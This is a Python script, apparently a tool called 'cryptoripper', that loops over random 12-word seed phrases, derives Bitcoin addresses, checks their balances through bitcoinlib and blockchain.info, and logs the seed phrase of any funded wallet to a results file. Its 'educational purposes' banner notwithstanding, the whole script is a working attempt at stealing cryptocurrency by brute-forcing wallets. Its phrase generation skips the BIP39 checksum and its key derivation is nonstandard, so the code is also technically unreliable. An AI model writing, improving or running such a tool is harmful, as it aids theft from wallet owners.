import asyncio
import bip32utils
import json
import os
import random
import requests
import time
from bitcoinlib.services.services import Service
from colorama import Fore, Back, Style
from mnemonic import Mnemonic

os.system('cls' if os.name == 'nt' else 'clear')

print(" ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  \r\n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \r\n░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \r\n░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░  \r\n░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \r\n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \r\n ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ \r\nbtc blockchain version   -   v1.0   -   github.com/aternyx/cryptoripper\r\n\r\n")
print(f"  {Fore.RED}WARNING: {Style.RESET_ALL}This program is made for educational purposes. It is only ")
print(f"           made to demonstrate the security of wallets with 12 word  ")
print(f"           mnemonic (known as seedphrase). Usage of this to steal    ")
print(f"           may lead to possible consequences. Thank you for reading. ")
print(f"     {Fore.YELLOW}NOTE: {Style.RESET_ALL}The script is incredibly slow in checking the balance of  ")
print(f"           the wallet. Planning to fix soon.                         ")
if not os.path.exists('results.txt'):
    # If the file doesn't exist, create it
    with open('results.txt', 'w') as file:
        print(f"  {Fore.BLUE}RESULTS: {Style.RESET_ALL}File 'results.txt' created since it did not exist.")
connection = Service()
print(f"     {Fore.BLUE}NODE: {Style.RESET_ALL}bitcoinlib Service() initialized.")
print(f"    {Fore.GREEN}START: {Style.RESET_ALL}Beginning the process in 5 seconds. Warnings may clear.   ")
time.sleep(5)

# Load the BIP39 wordlist
with open('bip39.txt', 'r') as f:
    bip39_words = f.readlines()

# Function to generate a random seed phrase
def generate_seed_phrase():
    words = random.sample(bip39_words, 12)
    return ' '.join([word.strip() for word in words])

def format_balance(balance):
    if balance < 100000000:
        return f"0.{str(balance).zfill(8)}"
    else:
        balance_str = str(balance)
        return f"{balance_str[:-8]},{balance_str[-8:]}".lstrip("0")


def get_wallet_info(address):
    url = "https://blockchain.info/q/addressbalance/"+address
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return 0

# Function to check the balance of a wallet
async def check_wallet_balance(seed_phrase):
    mnemon = Mnemonic('english')
    seed = mnemon.to_seed(seed_phrase)
    root_key = bip32utils.BIP32Key.fromEntropy(seed)
    root_address = root_key.Address()
    root_public_hex = root_key.PublicKey().hex()
    root_private_wif = root_key.WalletImportFormat()
    hexkey = Mnemonic().to_seed(seed_phrase).hex()
    wa = connection.getbalance(root_address)
    return int(wa), root_address

def move_cursor(x, y):
    print("\033[%d;%dH" % (y, x), end='')

# Function to update the status line at the bottom
def update_status(seeds_per_second, wallets_found, total_balance):
    os.system('cls' if os.name == 'nt' else 'clear')
    size = os.get_terminal_size()
    #move_cursor(size.columns, size.lines - 11)  # Move cursor to the 10th line (adjust as needed)
    txt = f"{Fore.BLACK}{Back.GREEN}  {seeds_per_second:.0f} seeds/s | {wallets_found} wallets found | {total_balance:.2f}BTC {Fore.GREEN}{Back.BLACK}{Style.RESET_ALL}"
    print(txt.center(size.columns))
    with open('results.txt', 'r') as file:
            lines = file.readlines()
            latest_lines = lines[-10:]
    for line in latest_lines:
            print(line.strip())

# Asynchronous loop to generate seed phrases and check balances
async def main():
    wallets_found = 0
    total_balance = 0.0
    seeds_generated = 0
    start_time = time.time()

    while True:
        seed_phrase = generate_seed_phrase()
        balance, address = await check_wallet_balance(seed_phrase)

        if balance > 0:
            with open('results.txt', 'a') as f:
                f.write(f"balance: {balance:.2f}sats | address: {address} | seedphrase: {seed_phrase}\n")
            wallets_found += 1
            total_balance += balance

        seeds_generated += 1
        elapsed_time = time.time() - start_time
        seeds_per_second = seeds_generated / elapsed_time

        update_status(seeds_per_second, wallets_found, total_balance)

        await asyncio.sleep(0.00001)  # Yield control to the event loop

if __name__ == "__main__":
    asyncio.run(main())
